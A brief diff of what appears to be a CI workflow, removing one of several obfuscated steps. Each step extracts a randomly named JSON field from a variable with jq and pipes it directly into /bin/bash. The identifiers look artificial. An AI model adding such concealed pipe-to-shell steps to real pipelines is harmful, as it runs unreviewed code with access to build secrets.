@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$usow727" | jq -r .lvrj74 | /bin/bash
           echo $wt1 | jq -r .sdjjt125 | /bin/bash
           printf '%s' "$vorzh7" | jq -r .xo4 | /bin/bash
-          printf '%s' "$c6181" | jq -r .u29 | /bin/bash
           echo $erlfk040 | jq -r .rev537 | /bin/bash
 
       - name: Archive data
